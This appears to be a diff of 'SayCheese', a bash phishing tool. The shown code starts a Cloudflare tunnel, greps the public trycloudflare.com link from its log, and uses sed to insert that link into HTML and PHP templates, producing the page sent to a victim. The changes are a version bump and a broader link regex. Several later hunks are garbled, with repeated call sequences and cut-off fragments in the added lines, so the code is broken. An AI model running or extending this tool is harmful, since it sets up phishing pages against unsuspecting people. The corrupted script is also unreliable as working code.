@@ -1,5 +1,5 @@
 #!/bin/bash
-# SayCheese v1.0
+# SayCheese v2.0
 # coded by: WHITE HAT
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
@@ -15,7 +15,7 @@ printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __
 printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
 printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by WHITE HAT\e[0m \n"
+printf " \e[1;77m v2.0 coded by WHITE HAT\e[0m \n"
 
 printf "\n"
 
@@ -104,7 +104,7 @@ fi
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting  server...\e[0m\n" 
 
 sleep 3
-send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log")
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
@@ -166,7 +166,7 @@ fi
 
 payload() {
 
-send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+send_link=$(grep -o 'https://[a-zA-Z0-9./?=_%:-]*\.trycloudflare.com' "${PWD}/cloudflare-log")
 
 sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
@@ -257,11 +257,45 @@ t1
 
 
 
+server
+payload
+checkfound
 
-ose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
+}
+
+banner
+dependencies
+start1
+
+t1
+
+
+
+d
+
+}
+
+banner
+dependencies
+start1
+
+
+
+server
+payload
+checkfound
+
+}
+
+banner
+dependencies
+start1
+
+t1
+
+
+
+in
 subdomain="${subdomain:-${default_subdomain}}"
 fi
 
@@ -288,7 +322,22 @@ dependencies
 start1
 
 
-1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+
+server
+payload
+checkfound
+
+}
+
+banner
+dependencies
+start1
+
+t1
+
+
+
+3m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
